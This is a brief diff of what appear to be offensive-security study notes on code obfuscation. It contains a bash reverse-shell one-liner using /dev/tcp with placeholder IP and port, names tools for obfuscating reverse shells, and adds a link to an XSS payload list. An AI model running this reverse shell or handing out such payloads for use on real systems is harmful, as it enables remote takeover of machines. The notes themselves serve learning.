@@ -55,3 +55,6 @@ Obfuscation is disguising or changing code to make it more difficult to understa
 bash -i >& /dev/tcp/<ip>/<port> 0>&1 | base64
 
 obfuscate reverse shell code, such as Veil and Shelter
+
+
+site for xss attacks: https://xss-payloads.paracyberbellum.io/payloads-list.html?s#category=system
